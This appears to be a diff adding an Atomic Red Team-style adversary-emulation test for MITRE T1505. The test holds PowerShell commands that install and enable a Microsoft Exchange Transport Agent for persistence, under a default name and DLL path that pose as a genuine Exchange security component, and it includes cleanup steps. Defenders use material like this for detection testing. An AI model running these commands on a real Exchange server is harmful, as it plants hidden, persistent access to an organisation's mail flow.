@@ -1,0 +1,42 @@
+---
+attack_technique: T1505
+display_name: Server Software Component
+
+atomic_tests:
+- name: Install MS Exchange Transport Agent Persistence
+  description: |
+    Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.
+    More details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    transport_agent_identity:
+      description: Friendly name of transport agent once installed.
+      type: string
+      default: Security Interop Agent
+    dll_path:
+      description: Path of DLL to use as transport agent.
+      type: path
+      default: c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
+    class_factory:
+      description: Class factory of transport agent.
+      type: string
+      default: Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
+
+  executor:
+    name: powershell
+    elevation_required: true # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
+    prereq_command: | # for the "command_prompt" executor, if any command returns a non-zero exit code, the pre-requisites are not met. For the "powershell" executor, all commands are run as a script block and the script block must return 0 for success. You can remove the prereq_command section if there are no pre-req's
+      Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
+      Get-TransportAgent -TransportService FrontEnd
+    command: | # these are the actaul attack commands, at least one command must be provided
+      Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}
+      Enable-TransportAgent #{transport_agent_identity}
+      Get-TransportAgent | Format-List Name,Enabled
+    cleanup_command: | # you can remove the cleanup_command section if there are no cleanup commands
+      Disable-TransportAgent #{transport_agent_identity}
+      Uninstall-TransportAgent #{transport_agent_identity}
+      Get-TransportAgent
+
